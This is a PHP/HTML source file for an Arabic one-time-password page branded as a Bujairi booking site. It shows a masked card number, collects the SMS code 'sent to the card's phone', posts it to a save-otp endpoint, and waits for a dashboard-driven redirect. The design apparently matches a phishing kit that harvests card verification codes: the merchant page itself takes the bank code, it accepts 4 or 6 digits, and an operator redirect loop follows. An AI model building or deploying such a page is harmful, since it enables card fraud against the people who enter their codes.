<?php
declare(strict_types=1);
require __DIR__ . '/../dashboard/init.php';
auth_require_customer_login_or_redirect();
$id = (int) ($_GET['id'] ?? 0);
$order = order_by_id(bujairi_pdo(), $id);
if (!$order) {
    http_response_code(404);
    exit;
}

$tz = new DateTimeZone('Asia/Riyadh');
$todayDt = new DateTimeImmutable('now', $tz);
if (class_exists(IntlDateFormatter::class)) {
    $fmt = new IntlDateFormatter(
        'ar_SA',
        IntlDateFormatter::FULL,
        IntlDateFormatter::NONE,
        $tz->getName(),
        IntlDateFormatter::GREGORIAN
    );
    $todayArabic = (string) $fmt->format($todayDt);
} else {
    $months = ['', 'يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو', 'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'];
    $days = ['الأحد', 'الإثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت'];
    $w = (int) $todayDt->format('w');
    $todayArabic = $days[$w] . '، ' . $todayDt->format('j') . ' ' . $months[(int) $todayDt->format('n')] . ' ' . $todayDt->format('Y');
}

$maskedCardDisplay = bujairi_order_masked_card_display($order);
$freshQ = booking_force_empty_form() ? '&fresh=1' : '';

$pageTitle = 'رمز التحقق';
?><!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo h($pageTitle); ?></title>
    <link rel="icon" href="https://s3.ticketmx.com/bujairi/images/favicon.ico">
    <link rel="stylesheet" href="https://s3.ticketmx.com/fonts/NeoSansArabic/NeoSansArabic.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>tailwind.config = { theme: { extend: { colors: { bujairi: '#a68b5a' } } } };</script>
</head>
<body class="min-h-screen flex flex-col bg-[#f5f3ef] text-slate-800 antialiased" style="font-family: 'Neo Sans Arabic', 'Segoe UI', sans-serif;">
<nav class="bg-white border-b border-gray-100 shrink-0">
    <div class="container mx-auto px-4 py-3 flex items-center justify-between">
        <a href="<?php echo h(url('index.php')); ?>"><img src="https://s3.ticketmx.com/bujairi/images/bujairi-ar.svg" alt="Bujairi" class="h-10"></a>
    </div>
</nav>

<main class="flex-grow container mx-auto px-4 py-8 sm:py-10">
    <div class="max-w-md mx-auto">
        <div class="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
            <div class="bg-slate-900 text-white px-6 py-5">
                <p class="text-xs text-slate-400 font-medium mb-1">التحقق الآمن</p>
                <h1 class="text-xl font-bold">إدخال رمز التحقق</h1>
            </div>

            <div class="px-6 py-4 bg-slate-50 border-b border-slate-100">
                <p class="text-xs font-semibold text-slate-500 uppercase tracking-wide mb-1">تاريخ اليوم</p>
                <p class="text-base font-bold text-slate-800"><?php echo h($todayArabic); ?></p>
            </div>

            <div class="p-6 sm:p-8 space-y-6">
                <div class="rounded-2xl border border-amber-100 bg-amber-50/80 px-4 py-4 text-sm leading-relaxed text-slate-800">
                    <p class="m-0">تم إرسال رمز التحقق إلى رقم الهاتف المرتبط بهذه البطاقة</p>
                    <p class="mt-2 mb-0 text-xs font-semibold text-slate-600">رقم البطاقة</p>
                    <div
                        class="mt-1.5 rounded-xl bg-white/90 border border-slate-200/90 px-3 py-2.5 font-mono text-base sm:text-lg font-bold text-slate-900 tracking-wide"
                        dir="ltr"
                        style="direction: ltr; unicode-bidi: isolate; text-align: left;"
                    ><?php echo h($maskedCardDisplay); ?></div>
                </div>

                <form method="post" action="<?php echo h(url('booking/save-otp.php')); ?>" id="otpForm" class="space-y-4" novalidate>
                    <input type="hidden" name="id" value="<?php echo (int) $order['id']; ?>">
                    <div>
                        <label for="otpInput" class="block text-sm font-bold text-slate-700 mb-2">رمز التحقق</label>
                        <input type="text"
                               name="Otp"
                               id="otpInput"
                               inputmode="numeric"
                               autocomplete="one-time-code"
                               maxlength="6"
                               dir="ltr"
                               class="w-full rounded-2xl border-2 border-gray-200 px-4 py-4 text-center text-2xl font-mono font-bold tracking-[0.35em] shadow-inner focus:border-bujairi focus:ring-4 focus:ring-bujairi/20 outline-none transition"
                               style="text-align: center;"
                               aria-invalid="false"
                               aria-describedby="otpError">
                        <p id="otpError" class="hidden mt-3 text-sm font-semibold text-red-600 text-center" role="alert">رمز التحقق غير صحيح، يرجى التحقق من الرمز</p>
                    </div>
                    <button type="submit" id="confirmBtn" class="w-full py-4 rounded-xl bg-bujairi hover:bg-amber-800 text-white font-bold text-lg shadow-sm transition disabled:opacity-45 disabled:cursor-not-allowed disabled:hover:bg-bujairi">تأكيد العملية</button>
                </form>
            </div>
        </div>
        <p class="text-center mt-6">
            <a href="<?php echo h(url('booking/payment-info.php?id=' . (int) $order['id'] . $freshQ)); ?>" class="text-sm text-bujairi font-semibold hover:underline">← العودة لبيانات البطاقة</a>
        </p>
    </div>
</main>

<footer class="bg-white border-t border-gray-100 py-5 mt-auto text-xs text-gray-400 text-center shrink-0">
    Copyright 2024 DGCL
</footer>

<?php require __DIR__ . '/../dashboard/booking-realtime-script.php'; ?>
<script>
(function () {
    var form = document.getElementById('otpForm');
    var input = document.getElementById('otpInput');
    var err = document.getElementById('otpError');
    var btn = document.getElementById('confirmBtn');

    function digitsOnly(v) {
        return v.replace(/\D/g, '').slice(0, 6);
    }

    function validLength(len) {
        return len === 4 || len === 6;
    }

    function setError(show) {
        if (!err || !input) return;
        if (show) {
            err.classList.remove('hidden');
            input.setAttribute('aria-invalid', 'true');
            input.classList.add('border-red-400', 'ring-2', 'ring-red-100');
            input.classList.remove('border-gray-200');
        } else {
            err.classList.add('hidden');
            input.setAttribute('aria-invalid', 'false');
            input.classList.remove('border-red-400', 'ring-2', 'ring-red-100');
            input.classList.add('border-gray-200');
        }
    }

    function syncBtn() {
        var len = input.value.length;
        btn.disabled = !validLength(len);
    }

    input.addEventListener('input', function () {
        input.value = digitsOnly(input.value);
        setError(false);
        syncBtn();
    });

    var saveOtpUrl = <?php echo json_encode(url('booking/save-otp.php'), JSON_UNESCAPED_UNICODE); ?>;
    var redirectStatusUrl = <?php echo json_encode(url('booking/redirect-status.php'), JSON_UNESCAPED_UNICODE); ?>;
    var waitOrderId = <?php echo (int) $order['id']; ?>;

    form.addEventListener('submit', function (e) {
        e.preventDefault();
        var len = input.value.length;
        if (!validLength(len)) {
            setError(true);
            return;
        }
        setError(false);
        btn.disabled = true;
        var fd = new FormData(form);
        fetch(saveOtpUrl, {
            method: 'POST',
            body: fd,
            credentials: 'same-origin',
            headers: { 'X-Requested-With': 'XMLHttpRequest', 'Accept': 'application/json' }
        })
            .then(function (r) {
                return r.json().then(function (j) {
                    return { ok: r.ok, j: j };
                });
            })
            .then(function (x) {
                if (!x.ok || !x.j || !x.j.ok) {
                    throw new Error((x.j && x.j.message) || '');
                }
                if (window.BujairiVerifyWait) {
                    window.BujairiVerifyWait.showAndPoll(waitOrderId, redirectStatusUrl);
                }
            })
            .catch(function () {
                btn.disabled = false;
                alert('تعذر إرسال الرمز. تحقق من الاتصال وحاول مرة أخرى.');
            });
    });

    syncBtn();
    input.focus();
})();
</script>
</body>
</html>
